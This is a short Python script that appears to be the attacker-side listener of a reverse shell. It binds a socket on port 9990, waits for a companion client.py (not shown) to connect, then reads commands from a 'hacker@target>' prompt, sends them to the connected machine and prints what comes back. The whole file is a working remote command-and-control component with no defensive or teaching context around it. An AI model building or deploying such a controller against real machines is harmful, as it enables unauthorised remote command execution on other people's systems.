#!/usr/bin/env python3
import socket
import sys

def create_socket():
	try :
		global host
		global port
		global s
		global bind_tries
		bind_tries = 0
		# the host and port variables should be the same as in client.py
		host = "localhost" #your ip address             
		port = 9990 #the port your want to listen to
		# the host and port variables should be the same as in client.py
		s = socket.socket()
		print("socket connected")
	except socket.error as e :
		print("socket creation error :{}".format(e))
		sys.exit(1)

def bind_socket():
	try:
		global host
		global port
		global s
		global bind_tries

		if bind_tries == 0 : bind_tries = 0

		print("binding socket to port :{}".format(port))
		bind_tries+=1
		s.bind((host,port))
		print("Success ! now listening")
		s.listen(port)
		socket_accept()
		s.close()
	except socket.error as e :
		print("error binding to port :{}".format(e))
		if bind_tries < 3 :
			print("retrying")
			bind_socket()
		else : bind_tries = 0
def socket_accept ():
	conn,addr = s.accept()
	print("[[{},{}]]".format(conn,addr))
	send_command(conn)
	conn.close()
def send_command(conn):
	continu = 1
	while continu:
		cmd = input("hacker@target>")
		if cmd == 'quit' or cmd == 'exit' : 
			continu = 0
		else :
			if(len(str.encode(cmd)) > 0):
				conn.send(str.encode(cmd))
				r = str(conn.recv(1024),"utf-8")
				print(r)
	conn.close()
try :
	create_socket()
	bind_socket()
	s.close()
except KeyboardInterrupt :
	print("bye")
	s.close()
	sys.exit()
